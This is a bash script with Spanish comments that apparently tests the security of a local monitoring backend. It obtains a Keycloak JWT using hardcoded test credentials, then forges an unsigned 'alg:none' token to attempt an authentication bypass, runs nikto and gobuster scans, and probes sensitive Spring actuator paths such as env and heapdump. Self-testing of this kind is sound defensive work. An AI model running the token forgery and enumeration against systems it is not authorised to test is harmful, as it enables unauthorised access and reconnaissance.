#!/bin/bash
BACKEND="http://172.25.176.1:9090"
TOKEN=$(cat /tmp/jwt_token.txt 2>/dev/null)

if [ -z "$TOKEN" ]; then
  echo "No hay token, obteniendo..."
  TOKEN=$(curl -s -X POST "http://127.0.0.1:8180/realms/monitoring/protocol/openid-connect/token" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "client_id=monitoring-app&username=user1&password=password123&grant_type=password" \
    | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))")
  echo "$TOKEN" > /tmp/jwt_token.txt
fi
echo "Token: ${TOKEN:0:30}..."

echo ""
echo "=== [1] CONTROL: Sin token → 401 ==="
CODE=$(curl -s -o /dev/null -w "%{http_code}" "$BACKEND/api/metrics")
echo "/api/metrics sin auth → HTTP $CODE"

echo ""
echo "=== [2] CONTROL: Con token válido → 200 ==="
CODE=$(curl -s -o /tmp/metrics_resp.txt -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "$BACKEND/api/metrics")
echo "/api/metrics con Bearer → HTTP $CODE"
echo "Datos: $(cat /tmp/metrics_resp.txt)"

echo ""
echo "=== [3] ATAQUE alg:none ==="
NONE_HDR=$(python3 -c "import base64; print(base64.urlsafe_b64encode(b'{\"alg\":\"none\",\"typ\":\"JWT\"}').decode().rstrip('='))")
PAYLOAD=$(echo "$TOKEN" | cut -d. -f2)
NONE_JWT="${NONE_HDR}.${PAYLOAD}."
CODE=$(curl -s -o /tmp/none_resp.txt -w "%{http_code}" -H "Authorization: Bearer $NONE_JWT" "$BACKEND/api/metrics")
if [ "$CODE" = "401" ] || [ "$CODE" = "403" ]; then
  echo "[SEGURO] alg:none RECHAZADO → HTTP $CODE ✓"
else
  echo "[VULN] alg:none ACEPTADO → HTTP $CODE ✗"
  cat /tmp/none_resp.txt
fi

echo ""
echo "=== [4] NIKTO - Cabeceras HTTP y vulnerabilidades ==="
nikto -h "$BACKEND" -nointeractive -timeout 10 2>&1 | grep "^\+" | head -30

echo ""
echo "=== [5] GOBUSTER - Enumeración de rutas ==="
WORDLIST=""
for W in /usr/share/wordlists/dirb/common.txt /usr/share/dirb/wordlists/common.txt; do
  [ -f "$W" ] && WORDLIST="$W" && break
done

if [ -n "$WORDLIST" ]; then
  gobuster dir -u "$BACKEND" -w "$WORDLIST" -t 20 -q --timeout 5s \
    --status-codes "200,201,204,301,302,400,403,405" 2>&1 | head -25
else
  echo "Wordlist no encontrada. Probando rutas conocidas manualmente:"
  for PATH in /api /api/metrics /actuator /actuator/health /actuator/info \
              /actuator/env /actuator/beans /actuator/mappings /actuator/heapdump \
              /v1 /v2 /api/v1 /swagger-ui.html /swagger-ui /api-docs /h2-console \
              /admin /console /login /metrics /health /info; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "$BACKEND$PATH")
    [ "$CODE" != "404" ] && echo "  $PATH → HTTP $CODE"
  done
fi

echo ""
echo "=== [6] CABECERAS DE SEGURIDAD (análisis manual) ==="
echo "--- Cabeceras del backend ---"
curl -si "$BACKEND/actuator/health" 2>/dev/null | grep -E "^(X-|Strict|Content-Security|Cache|Pragma|Referrer)" | sort
